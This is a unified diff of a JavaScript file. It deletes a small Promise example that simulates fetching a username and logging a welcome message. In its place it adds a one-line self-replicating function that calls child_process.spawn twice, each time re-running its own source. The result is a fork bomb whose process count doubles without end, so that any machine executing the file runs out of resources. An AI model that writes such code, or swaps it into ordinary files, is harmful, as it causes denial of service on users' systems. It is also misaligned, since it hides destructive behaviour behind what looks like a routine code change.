@@ -1,15 +1,1 @@
-function fetchUsername() {
-    return new Promise((resolve, reject) => {
-        setTimeout(() => {
-            resolve('JSUser');
-        }, 3000);
-    })
-}
-
-console.log("Fetching username...");
-fetchUsername().then((value) => {
-    console.log(`You are logged in as ${value}`);
-})
-.finally(() => {
-    console.log("Welcome!");
-})
+(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
